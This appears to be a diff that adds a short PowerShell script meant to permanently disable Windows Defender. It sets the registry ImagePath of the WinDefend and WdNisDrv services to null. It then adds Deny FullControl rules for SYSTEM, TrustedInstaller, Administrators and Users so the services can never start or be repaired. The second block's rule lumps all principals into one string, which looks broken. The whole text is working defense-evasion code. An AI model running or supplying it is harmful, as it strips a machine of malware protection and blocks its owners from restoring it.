@@ -1,0 +1,37 @@
+#break the service so that it can never start
+
+$registryPath = "HKLM:\SYSTEM\CurrentControlSet\Services\WinDefend"
+Set-ItemProperty -Path  $RegistryPath -Name ImagePath -Value null
+$key = Get-Item -Path $registryPath
+$users = @("TrustedInstaller", "ALL APPLICATION PACKAGES", "CREATOR OWNER", "SYSTEM", "Administrators", "Users")
+foreach ($user in $users) {
+    $acl = Get-Acl -Path $registryPath
+    $rule = New-Object System.Security.AccessControl.RegistryAccessRule($user, "FullControl", "Deny")
+    $acl.AddAccessRule($rule)
+    Set-Acl -Path $registryPath -AclObject $acl
+}
+
+
+
+
+#break the service so that it can never start
+$RegistryPath = "HKLM:\SYSTEM\CurrentControlSet\Services\WdNisDrv"
+$Acl = Get-Acl -Path $RegistryPath
+Set-ItemProperty -Path  $RegistryPath -Name ImagePath -Value null
+$Rule = New-Object System.Security.AccessControl.RegistryAccessRule(
+    "TrustedInstaller,ALL APPLICATION PACKAGES,CREATOR OWNER,SYSTEM,Administrators,Users",
+    "FullControl",
+    "Deny",
+    "None",
+    "None",
+    "None"
+)
+$Acl.AddAccessRule($Rule)
+Set-Acl -Path $RegistryPath -AclObject $Acl
+
+
+
+
+
+
+
